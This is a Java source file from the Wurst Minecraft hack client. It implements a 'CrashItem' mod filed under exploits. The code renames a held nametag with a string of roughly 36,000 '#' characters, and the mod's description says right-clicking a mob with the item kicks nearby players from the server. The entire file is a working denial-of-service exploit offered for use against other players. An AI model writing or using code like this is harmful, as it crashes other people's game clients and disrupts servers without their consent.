/*
 * Copyright © 2014 - 2016 | Wurst-Imperium | All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.mods;

import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;

@Mod.Info(category = Mod.Category.EXPLOITS,
	description = "Generates a CrashItem.\n"
		+ "Right click a mob with it to kick nearby players from the server.",
	name = "CrashItem",
	tags = "CrashNametag, CrashTag, crash item, crash nametag, crash tag",
	tutorial = "Mods/CrashItem")
public class CrashItemMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(mc.thePlayer.inventory.getCurrentItem() == null
			|| !(mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemNameTag))
		{
			wurst.chat.error("You are not holding a nametag in your hand.");
			setEnabled(false);
			return;
		}else if(!mc.thePlayer.capabilities.isCreativeMode)
		{
			wurst.chat.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		String stackName = "";
		for(int i = 0; i < 3000; i++)
		{
			StringBuilder builder = new StringBuilder().append(stackName);
			stackName = builder.append("############").toString();
		}
		mc.thePlayer.inventory.getCurrentItem().setStackDisplayName(stackName);
		mc.displayGuiScreen(new GuiInventory(mc.thePlayer));
		mc.thePlayer.closeScreen();
		wurst.chat.message("CrashItem created. Right click a mob with it.");
		setEnabled(false);
	}
}
